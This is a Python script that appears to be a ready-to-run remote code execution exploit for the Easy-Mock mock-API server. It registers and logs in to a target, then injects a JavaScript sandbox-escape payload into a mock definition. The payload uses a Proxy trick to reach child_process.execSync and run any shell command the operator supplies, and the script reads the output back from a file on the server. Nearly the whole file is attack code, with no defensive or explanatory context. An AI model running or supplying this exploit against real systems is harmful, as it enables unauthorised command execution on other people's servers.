# -*- coding: utf-8 -*-

# @Time : 2021/8/23 13:18

# @Author : Deep
# @Email : deep.fn@gmail.com
# @Git : https://github.com/Deep0
# @File : easy-mock-rce.py
# project : https://github.com/easy-mock/easy-mock
import requests
import json
# import random
# import string
import argparse

# username = ''.join(random.sample(string.ascii_letters + string.digits, 8))
# password = ''.join(random.sample(string.ascii_letters + string.digits, 8))

session = requests.Session()
token = ''
project_id = ''
InterId = ''
username = 'easymocKExpa'
password = 'easymocKExpa'


def register(target):
    url = target + "/api/u/register"
    headers = {
        "Content-Type": "application/json;charset=utf-8",
    }
    json_data = {"name": username, "password": password}
    requests.post(url, headers=headers, json=json_data)


def login(target):
    global token
    url = target + "/api/u/login"
    headers = {
        "Content-Type": "application/json;charset=utf-8"
    }
    json_data = '{"name": "' + username + '", "password": "' + password + '"}'
    req = session.post(url, headers=headers, data=json_data)
    token = str(json.loads(req.text)["data"]["token"])
    # print(req.text)
    # print(username, password)
    # print(token)


def GetProject(target):
    global token, project_id
    url = target + "/api/project?page_size=30&page_index=1&keywords=&type=&group=&filter_by_author=0"
    header = {
        "Authorization": "Bearer " + token
    }
    req = session.get(url, headers=header).text
    projects = json.loads(req)
    project_id = projects['data'][0]['_id']
    # print(project_id)


def GetInterId(target):
    global token, project_id, InterId
    url = target + "/api/mock?project_id=" + project_id + "&page_size=2000&page_index=1&keywords="
    header = {
        "Authorization": "Bearer " + token
    }
    req = session.get(url, headers=header).text
    Inters = json.loads(req)
    InterId = Inters['data']['mocks'][0]['_id']


def UpdateMock(target, cmd):
    global token, InterId
    url = target + "/api/mock/update"
    header = {
        "Authorization": "Bearer " + token
    }
    json_data = {"description": "mock", "method": "get",
                 "mode": "{\n  'exp': function() {\n    try {\n      Buffer.from(new Proxy({}, {\n        getOwnPropertyDescriptor() {\n          throw f => f.constructor(\"return process\")();\n        }\n      }));\n    } catch (e) {\n      return e(() => {}).mainModule.require(\"child_process\").execSync(\"" + cmd + ">dist/1.txt\").toString();\n    }\n  }\n}",
                 "id": InterId, "url": "/" + username}
    req = session.post(url, headers=header, json=json_data)
    # print(req.text)
    # print(project_id)


def RunMock(target):
    url = target + "/mock/{}/example/{}".format(project_id, username)
    header = {
        "Authorization": "Bearer " + token
    }
    req = requests.get(url, headers=header)
    # print(req.text)


def OutCmd(targer):
    url = target + "/dist/1.txt"
    req = requests.get(url=url)
    return req.text


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Easy-Mock RCE , need register")
    parser.add_argument('-u', '--url')
    parser.add_argument('-e', '--exec', default='')
    args = parser.parse_args()
    target = str(args.url).rstrip('/')
    cmd = str(args.exec)
    if args.url and args.exec:
        register(target)
        login(target)
        # print('Login success!\nusername:{}\npassword:{}'.format(username,
        #                                                         password) + '\nPlease add \'-e\'  or \'--e\' run Command!')
        login(target)
        GetProject(target)
        GetInterId(target)
        UpdateMock(target, cmd)
        RunMock(target)
        print(OutCmd(target))
    else:
        print('Need The Target,please add -h / --help')
